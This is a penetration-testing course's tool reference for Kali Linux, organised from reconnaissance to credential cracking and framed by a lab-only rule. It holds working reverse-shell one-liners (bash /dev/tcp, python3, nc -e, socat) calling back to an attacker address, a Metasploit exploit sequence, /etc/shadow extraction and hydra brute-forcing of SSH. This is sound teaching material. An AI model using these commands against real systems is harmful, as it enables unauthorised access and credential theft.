# The Toolkit — every tool, explained

Every tool below ships with **Kali Linux**. This page is organised the way an engagement
actually runs — the **five stages** — and for each tool it gives the one-line *what it is*,
a typical command, **a table explaining every flag you will use**, and how to read the output.
Walkthroughs and lesson cards reference this page directly.

> **Read this with a machine open.** The command tables here are the *reference*; the
> `labs/<slug>/README.md` files show the same commands with real output, line by line, and
> [`CONCEPTS.md`](CONCEPTS.md) explains the underlying ideas.

---

## 0. The five stages (why the tools are grouped this way)

| Stage | Question it answers | Tools on this page |
| --- | --- | --- |
| **1. Reconnaissance** | *What is on the network, and which ports are open?* | `ip`, `arp-scan`, `netdiscover`, `nmap` |
| **2. Enumeration** | *What exactly is each open service, and what does it expose?* | `whatweb`, `ffuf`, `gobuster`, `nikto`, `enum4linux`, `smbclient`, `smbmap`, `ftp`, `ssh`, `dnsrecon`, `snmpwalk` |
| **3. Exploitation (foothold)** | *How do I turn a finding into a shell?* | `searchsploit`, `msfconsole`, `nc`/`ncat`, `socat`, reverse-shell payloads |
| **4. Privilege escalation** | *How do I go from a user to root?* | `sudo -l`, `find`, `getcap`, `pspy`, `linpeas`, `uname` |
| **5. Credentials & post-exploitation** | *What do the credentials unlock, and what did I leave behind?* | `john`, `hashcat`, `hydra`, `unzip`/`*2john` |

**Everything is prefixed by an ethical rule:** only ever run these inside your isolated lab
(`docs/LAB-SETUP.md`) against machines you downloaded yourself.

---

## 1. Reconnaissance

### `ip` — your own interfaces and addresses

```bash
ip -br a
```

| Flag | Meaning |
| --- | --- |
| `-br` | **brief** — one line per interface instead of the full detail |
| `a` | show **all** interfaces (also `addr`) |

The interface on your lab subnet (e.g. `192.168.56.10/24`) is the one every scan, listener and
reverse shell must use.

### `arp-scan` — discover live hosts (layer 2)

```bash
sudo arp-scan --localnet
```

| Flag | Meaning |
| --- | --- |
| `-l` / `--localnet` | scan every address in the interface's own subnet |
| `-I eth0` / `--interface=eth0` | choose the interface explicitly |

**Why it beats `ping`:** ARP works at layer 2, so hosts that ignore ICMP still answer.
`sudo` is required to craft raw frames.

### `netdiscover` — passive/active discovery

```bash
sudo netdiscover -r 192.168.56.0/24
```

`-r` sets the range. Useful when you do not yet know the subnet; it can also listen passively
for ARP traffic to reveal hosts without sending anything.

### `nmap` — the port scanner (the single most important tool here)

```bash
sudo nmap -sn 192.168.56.0/24                      # host discovery only
sudo nmap -p- --min-rate 1000 192.168.56.101       # all 65,535 TCP ports, fast
sudo nmap -sC -sV -p- -oA scans/all 192.168.56.101 # the scan you run on EVERY box
sudo nmap -sU --top-ports 50 192.168.56.101        # common UDP ports
sudo nmap --script vuln 192.168.56.101             # run the NSE "vuln" scripts
```

| Flag | What it does | When |
| --- | --- | --- |
| `-sn` | **ping scan** — host discovery only, no ports | find which IPs are alive |
| `-p-` | scan **all** 65,535 TCP ports (not just the top 1000) | always, on a lab box |
| `-p 22,80,443` | scan a specific list | re-checking known ports |
| `-sV` | probe for the **service and version** | always — versions drive exploit research |
| `-sC` | run the default set of **NSE scripts** | always — free banners, titles, shares |
| `--script vuln` | run the vulnerability-detection scripts | targeted second pass |
| `-sU` | **UDP** scan | the half everyone forgets; slow, so use `--top-ports` |
| `-O` | OS detection | when you need to know the platform |
| `-T4` | timing template **fast but reliable** (`-T0`…`-T5`) | default choice; avoid `-T5`, it causes false negatives |
| `--min-rate 1000` | send at least 1000 packets/sec | speeding up a `-p-` scan |
| `-oA scans/all` | save output in **all** formats (`.nmap`, `.xml`, `.gnmap`) | always — take notes automatically |
| `-Pn` | treat the host as up; skip discovery | hosts that block ARP/ICMP |

**Reading the output:**
- `open` = a service is listening → attack surface. `filtered` = a firewall dropped it.
  `closed` = reachable, nothing there.
- `-sV` prints product + version → `searchsploit` that version.
- The line `Not shown: 65532 closed ports` tells you the rest of the range was scanned and empty —
  do not skip it, it is how you know `-p-` really ran.

---

## 2. Enumeration

### Web

```bash
whatweb http://192.168.56.101                                  # fingerprint the whole stack
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.56.101/FUZZ
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
nikto -h http://192.168.56.101                                 # web server vulnerability scan
```

| Tool | Key flags | Meaning |
| --- | --- | --- |
| `ffuf` | `-w` | wordlist |
| | `-u …/FUZZ` | target; **`FUZZ` marks the injection point** |
| | `-mc 200,301` | only show these HTTP status codes |
| | `-fs <size>` | filter out responses of this size (removes "not found" noise) |
| `gobuster` | `-x php,html` | also try each word with these **extensions** — the highest-value flag |
| | `-t 50` | threads |
| `nikto` | `-h` | host/target |

**The status codes are the whole result:** `200` exists, `301/302` redirects (often to a login),
`403` exists but is forbidden (still a finding), `404` is nothing. `gobuster` with no `-x` finds
far less than it should — that is the classic beginner miss.

### SMB / Samba (ports 139, 445)

```bash
enum4linux -a 192.168.56.101
smbclient -L //192.168.56.101 -N
smbmap -H 192.168.56.101
```

| Tool | Key flags | Meaning |
| --- | --- | --- |
| `enum4linux` | `-a` | run **all** simple enumeration (users, shares, policy, OS) |
| | `-U` / `-S` | users only / shares only |
| `smbclient` | `-L` | **list** shares |
| | `-N` | no password → **null session** |
| | `//host/share` | then drop into an interactive session |
| `smbmap` | `-H` | host; shows per-share **permissions** (`READ`, `WRITE`, `NO ACCESS`) |

### FTP / SSH

```bash
ftp 192.168.56.101        # try anonymous / anonymous
ssh user@192.168.56.101
```

FTP banners often leak the version (→ `searchsploit`). SSH is rarely the *entry* point but is the
usual *privesc* destination once you have a password.

### DNS / NetBIOS / SNMP

```bash
dnsrecon -d target.local
nmap --script nbstat 192.168.56.101
snmpwalk -c public -v1 192.168.56.101
```

`-c public` is the default SNMP **community string** — an unauthenticated read of system info when
it is left at the default.

---

## 3. Exploitation (foothold)

### `searchsploit` — offline Exploit-DB

```bash
searchsploit samba 2.2
searchsploit -m 10            # copy the exploit into the current directory
searchsploit -x 10            # read it without copying
```

| Flag | Meaning |
| --- | --- |
| `-t "title"` | search **titles only** (less noise) |
| `-m <id>` | **mirror** (copy) the exploit locally |
| `-x <id>` | examine/inspect the exploit text |

**Always read the exploit before running it** — the top of the file lists the exact version range
and usage. A close-looking result that does not match your version is a rabbit hole.

### Metasploit

```bash
msfconsole
msf6 > search trans2open
msf6 > use exploit/linux/samba/trans2open
msf6 > set RHOSTS 192.168.56.101
msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.56.10
msf6 > run
```

| Option | Meaning |
| --- | --- |
| `RHOSTS` | the **target** address |
| `LHOST` | **your** address — must be the lab interface, never `127.0.0.1` |
| `LPORT` | the port your handler listens on |
| `PAYLOAD` | what runs on the target after the exploit |

If a session dies immediately ("Meterpreter session … Died"), the payload and the target
architecture disagree — try a plain `cmd/unix/reverse` shell, or `show targets` and pick manually.

### Netcat / socat — the Swiss-army network tool

```bash
nc -lvnp 4444                 # listener on YOUR Kali
nc -e /bin/bash 192.168.56.10 4444   # target side, only if that nc supports -e
```

| Flag | Meaning |
| --- | --- |
| `-l` | **listen** mode |
| `-v` | verbose |
| `-n` | numeric only (no DNS) |
| `-p 4444` | port |
| `-e /bin/bash` | execute a program and wire it to the socket (many `nc` builds disable this — use `socat` instead) |

`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.56.10:4444` gives a **fully
interactive** shell, which is why it is preferred when available.

### Reverse shells (memorise the shapes)

```bash
# bash
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1

# python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.56.10",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

A **reverse** shell (target connects out to you) beats a **bind** shell (you connect in) because
egress is usually less filtered than ingress. See [`CONCEPTS.md`](CONCEPTS.md) §12 and Module 06.

### Upgrade a dumb shell to a real TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# press Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=/bin/bash
```

Four steps, always in this order. Without it, `su`, `sudo` and interactive tools misbehave and
`Ctrl+C` kills your whole shell.

---

## 4. Privilege escalation (Linux)

```bash
sudo -l                                  # what may I run as root, and can I edit those files?
id; whoami; hostname                    # orientation: uid, and real vs effective
uname -a; cat /etc/os-release           # kernel / distro (for kernel exploits)
find / -perm -4000 -type f 2>/dev/null  # SUID binaries
find / -perm -2000 -type f 2>/dev/null  # SGID binaries
getcap -r / 2>/dev/null                  # binaries carrying capabilities
cat /etc/crontab; ls -la /etc/cron*      # scheduled jobs
find / -writable -user root -type f 2>/dev/null   # files root owns that YOU can write
groups                                   # am I in docker / lxd / disk / adm?
```

| Command | Why it is on the checklist |
| --- | --- |
| `sudo -l` | the highest-yield vector — a `NOPASSWD` rule or a GTFOBins binary is instant root |
| `find -perm -4000` | `-4000` = the **SUID** bit; an unexpected SUID binary is a shell |
| `getcap -r /` | capabilities are a finer-grained SUID (e.g. `cap_dac_read_search`) |
| `/etc/crontab` + `pspy` | jobs run as root on a schedule; `pspy` sees jobs `crontab` hides |
| `find -writable -user root` | a root-owned script you can edit runs with root's privileges |
| `groups` | membership in `docker`/`lxd`/`disk` **is** root, no exploit needed |

The full ordered method is Module 05; the **exact order to try them** (sudo → SUID → capabilities
→ cron → writable → groups → kernel) is the thing to memorise.

Auto-enumerators (run them, then **verify by hand**):

```bash
./linpeas.sh
./LinEnum.sh
./pspy64
```

### Windows equivalent (for Windows targets)

```powershell
whoami /priv
systeminfo
.\winPEAS.exe
AccessChk.exe /accepteula -uwcqv "Authenticated Users" *
```

---

## 5. Credentials & cracking

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
```

| Tool | Key flags | Meaning |
| --- | --- | --- |
| `john` | `--wordlist=` | the dictionary to try |
| | `--format=` | force a hash format (e.g. `raw-md5`, `md5crypt`, `phpass`, `bcrypt`) |
| | `--rules` | apply mangling rules (capitalise, append digits, leetspeak) |
| | `--show` | print already-cracked results without re-cracking |
| `hashcat` | `-m <n>` | hash **mode** (`0`=MD5, `1000`=NTLM, `400`=phpass, `1800`=sha512crypt) |
| | `-a 0` | attack mode `0` = straight wordlist |
| | `-r best64.rule` | apply a rules file |
| `hydra` | `-l`/`-L` | one login / a login **list** |
| | `-p`/`-P` | one password / a password **list** |
| | `-t` | parallel tasks (keep low — many boxes lock out) |

Cracking happens **offline** against a stolen hash (john/hashcat). Brute-forcing runs **online**
against a live service (hydra) and is noisier and riskier. **Always single-quote a hash** on the
command line — the shell will otherwise expand `$1$`, `$6$`, `$P$` and silently truncate it.

To prepare Linux hashes for john, combine the two files first:

```bash
unshadow /etc/passwd /etc/shadow > combined.txt
```

Archive/key hashes use the helper converters: `zip2john`, `rar2john`, `ssh2john`, `pdf2john`.

---

## 6. Extended systems & defensive track (Modules 07–11)

These tools support the *systems and defence* half of the curriculum.

### Permissions, DAC & MAC (Module 07)

```bash
ls -l / ls -la                 # the nine bits, the sticky `t`, an ACL `+`
getfacl /path; setfacl -m u:bob:r /path      # POSIX ACLs
lsattr /etc/passwd; chattr +i /etc/passwd    # file attributes (`+i` = immutable)
getenforce; ls -Z /var/www/html              # SELinux mode and security contexts
sudo aa-status                               # AppArmor profiles: loaded / enforce / complain
```

### Identity, authentication & PAM (Module 08)

```bash
id; getent passwd <user>        # identity and group membership
cat /etc/passwd; cat /etc/shadow  # the identity and secret stores
sudo -l; sudo visudo            # what is delegated, and how to change it safely
```

### Cryptography, GPG & file encryption (Module 09)

```bash
gpg --full-generate-key; gpg --list-keys
gpg -c file.txt                 # symmetric (one passphrase)
gpg -e -r user file.txt         # asymmetric (public key)
openssl enc -aes-256-cbc -pbkdf2 -in f -out f.enc   # modern KDF
```

### Firewalls & sandboxing (Module 10)

```bash
sudo iptables -L -n -v          # read the ruleset
sudo ufw status verbose
sudo nft list ruleset
# systemd sandboxing (defender): PrivateTmp=, ProtectSystem=, NoNewPrivileges=
```

### Malware analysis & YARA (Module 11)

```bash
file sample.bin; sha256sum sample.bin; strings -n 8 sample.bin
binwalk sample.bin              # embedded files
yara rules.yar sample.bin       # run a detection rule
strace -f ./sample              # dynamic analysis (in a safe VM!)
```

---

## 7. Wordlists you will reuse

| Path | Use |
| --- | --- |
| `/usr/share/wordlists/dirb/common.txt` | directory / file brute-force |
| `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | larger content-discovery list |
| `/usr/share/wordlists/rockyou.txt` | password cracking |
| `/usr/share/seclists/` | the big collection (install the `seclists` package) |
| `cewl`-generated list | **targeted** wordlist from the site's own words |

> **Wordlist rule of thumb:** a generic list finds generic flaws; a *targeted* list (`cewl`,
> `cupp`, a theme) finds the box. If a crack "finds nothing", your list is usually the problem —
> not the tool.

---

_Back to the [README](../README.md) · [Lab setup](LAB-SETUP.md) · [Concepts primer](CONCEPTS.md) · [Catalog](CATALOG.md) · [Reading order](INDEX.md)._
